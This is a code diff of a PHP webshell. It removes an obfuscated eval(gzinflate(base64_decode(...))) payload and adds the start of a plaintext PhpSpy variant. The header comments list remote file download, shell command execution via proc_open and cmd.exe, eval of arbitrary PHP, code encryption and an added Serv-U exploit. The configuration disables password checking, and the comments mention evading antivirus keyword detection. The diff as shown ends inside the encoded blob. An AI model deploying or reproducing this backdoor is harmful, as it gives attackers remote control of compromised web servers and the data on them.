@@ -1,7 +1,1596 @@
 <?php
-/*
-online encode by cha88! 
+/**
+--------------------------------------------------------------------------------
+浅蓝的辐射鱼修改
+Http文件下载功能，用来下载网络上文件的。
+proc_open执行命令功能，用来在原本几个函数无法使用时执行CMD的(THX 我非我)。
+使用关键词查找文件功能。
+mysql fun语句提示。
+php代码压缩和加密功能(55KB的phpspy加密后22KB)。
+在目录后面加了一个改名目录的连接。
+环境变量里加了一个当前php进程用户的显示。
+eval在线执行php脚本。
+--------------------------------------------------------------------------------
+七剑独孤修改
+加入SERV-U的EXP(这个EXP好像是我非我写的?)
+入口处加入alexa排名
+颜色上做了一些改动
+修正了两处BUG
+---------------------------------------------------------------------------------
+原版本功能请见http://www.4ngel.net/project/phpspy.htm
+**/
+error_reporting(7);
+ob_start();
+$mtime = explode(' ', microtime());
+$starttime = $mtime[1] + $mtime[0];
+/*===================== 程序配置 =====================*/
+// 是否需要密码验证,1为需要验证,其他数字为直接进入.下面选项则无效
+$admin['check'] = "0";
+// 如果需要密码验证,请修改登陆密码
+$admin['pass']  = "3204416";
+// 是否允许phpspy本身自动修改编辑后文件的时间为建立时间(yes/no)
+$retime = "no";
+// 默认cmd.exe的位置,proc_open函数要使用的,linux系统请对应修改.(假设是winnt系统在程序里依然可以指定)
+$cmd = "cmd.exe";
+// 下面是phpspy显示版权那栏的，因为被很多程序当成作为关键词杀了，鱼寒~~允许自定义吧。还是不懂别改~~
+$notice = "[<a href=\"http://www.51shell.cn\" title=\"浅蓝的辐射鱼\">Saiy</a>]  [<a href=\"http://www.4gnel.net\" title=\"安全天使\">S4T</a>]  [<a href=\"http://1v1.name\" title=\"7jdg\">7jdg</a>]<br><FONT color=#ff3300>声明:请勿使用本程序从事非法行为，否则后果自负！</font>";
+/*===================== 配置结束 =====================*/
+// 允许程序在 register_globals = off 的环境下工作
+$onoff = (function_exists('ini_get')) ? ini_get('register_globals') : get_cfg_var('register_globals');
 
-*/
-eval(gzinflate(base64_decode('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